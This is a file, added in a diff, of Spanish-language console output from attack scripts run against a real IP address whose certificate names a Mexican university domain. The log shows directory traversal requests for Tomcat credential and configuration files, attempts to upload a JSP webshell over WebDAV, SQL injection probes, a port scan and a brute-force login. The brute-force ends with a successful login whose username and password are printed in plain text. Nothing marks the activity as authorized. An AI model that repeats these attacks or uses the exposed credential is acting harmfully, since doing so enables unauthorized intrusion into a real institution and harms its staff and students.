@@ -1,0 +1,100 @@
+Explotación Real del Directory Traversal:
+
+[+] Explotando vulnerabilidad real del calendario...
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml
+Respuesta: 1381 bytes
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?date=../../../../conf/tomcat-users.xml
+Respuesta: 1323 bytes
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?description=../../../../conf/tomcat-users.xml
+Respuesta: 1323 bytes
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?param=../../../../conf/tomcat-users.xml
+Respuesta: 1323 bytes
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?file=../../../../conf/tomcat-users.xml
+Respuesta: 1323 bytes
+Probando: http://189.254.143.102/examples/jsp/cal/cal2.jsp?page=../../../../conf/tomcat-users.xml
+Respuesta: 1323 bytes
+
+[+] Acceso directo a archivos...
+Archivo: /conf/tomcat-users.xml -> 3579 bytes
+Archivo: /conf/server.xml -> 3579 bytes
+Archivo: /logs/catalina.out -> 3579 bytes
+Archivo: /webapps/manager/WEB-INF/web.xml -> 3579 bytes
+Archivo: /WEB-INF/web.xml -> 3579 bytes
+
+Explotación WebDAV para Subida de Webshell:
+
+=== EXPLOTACIÓN WEBDAV ===
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: 
+PUT: 200
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045:
+DELETE: 200
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: 
+PROPFIND: 200
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: 
+MKCOL: 200
+[+] Probando upload WebDAV...
+Intentando upload a: http://189.254.143.102/webdav/shell.jsp
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045:
+PUT Response: 404
+PUT failed: 404
+Intentando upload a: http://189.254.143.102/examples/webdav/shell.jsp
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: 
+PUT Response: 404
+PUT failed: 404
+Intentando upload a: http://189.254.143.102/shell.jsp
+PUT Response: 404
+PUT failed: 404
+Intentando upload a: http://189.254.143.102/test/shell.jsp
+PUT Response: 404
+PUT failed: 404
+Intentando upload a: http://189.254.143.102/uploads/shell.jsp
+  warnings.warn(
+PUT Response: 404
+PUT failed: 404
+
+SQL Injection Corregido (HTTP en lugar de HTTPS):
+
+🔍 Endpoint: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+🔍 Endpoint: /jsp/escolar/muestra_bachillerato_ajax.jsp
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato=1 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+
+Análisis de Puertos y Servicios:
+
+[+] Analizando servicios...
+
+📡 Puerto 80: ABIERTO
+   Error obteniendo info: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: / (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+
+📡 Puerto 443: ABIERTO
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+   Service: HTTPS
+   Server: Apache-Coyote/1.1
+
+📡 Puerto 8080: ABIERTO
+   Error obteniendo info: HTTPConnectionPool(host='189.254.143.102', port=8080): Read timed out. (read timeout=5)
+
+📡 Puerto 8009: ABIERTO
+   Service: AJP (Apache JServ Protocol)
+   Usado para comunicación entre Apache y Tomcat
+
+📡 Puerto 8005: ABIERTO
+   Service: Tomcat Shutdown Port
+   ⚠️  Puerto de shutdown de Tomcat
+
+📡 Puerto 8443: ABIERTO
+
+Fuerza Bruta Mejorada con Session Handling:
+
+[+] Fuerza bruta inteligente...
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+Session obtenida, cookies: 1
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+C:\Users\MarxB\AppData\Local\Programs\Python\Python313\Lib\site-packages\urllib3\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host '189.254.143.102'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+🎉 LOGIN EXITOSO: hnieto:utslp
